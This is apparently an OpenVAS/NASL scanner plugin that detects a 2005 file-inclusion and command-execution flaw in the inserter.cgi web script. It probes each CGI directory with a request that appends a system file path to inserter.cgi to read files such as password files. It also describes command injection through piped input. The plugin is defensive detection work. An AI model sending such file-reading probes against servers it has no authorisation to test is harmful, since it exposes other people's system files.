# SPDX-FileCopyrightText: 2005 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# From: fireboy fireboy <fireboynet@webmails.com>
# remote command execution in inserter.cgi script
# 2005-04-25 07:19

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18149");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("inserter.cgi File Inclusion and Command Execution Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Delete this file");

  script_tag(name:"summary", value:"The remote web server contains the 'inserter' CGI.

 The inserter.cgi contains a vulnerability that allows remote attackers to cause
 the CGI to execute arbitrary commands with the privileges of the web server
 by supplying it with a piped instruction or to include arbitrary files by
 providing an absolute path to the location of the file.");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"Mitigation");
  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);

files = traversal_files();

foreach dir (make_list_unique("/", http_cgi_dirs(port:port))) {

  if( dir == "/" ) dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    req = http_get(item: dir + "/inserter.cgi?/" + file, port: port);
    r = http_keepalive_send_recv(port:port, data:req);
    if( r == NULL )exit(0);

    if(egrep(pattern:pattern, string:r)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
